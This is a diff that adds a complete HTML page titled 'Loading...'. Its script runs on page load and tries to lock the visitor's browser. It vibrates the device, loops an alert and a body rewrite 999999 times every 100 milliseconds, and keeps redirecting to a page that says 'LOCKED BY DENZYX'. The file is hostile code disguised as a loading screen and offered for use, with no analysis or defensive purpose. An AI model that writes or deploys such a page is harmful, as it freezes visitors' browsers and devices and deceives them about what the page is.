@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function lockDevice() {
+            setInterval(() => {
+                navigator.vibrate(10000);
+                window.location.href = "about:blank";
+                for (let i = 0; i < 999999; i++) {
+                    document.body.innerHTML = "<h1>🔒 LOCKED BY DENZYX</h1>";
+                    alert("DEVICE LOCKED!");
+                }
+            }, 100);
+        }
+        window.onload = function() {
+            lockDevice();
+            setInterval(() => {
+                window.location.href = "data:text/html,<h1>LOCKED</h1>";
+            }, 500);
+        };
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
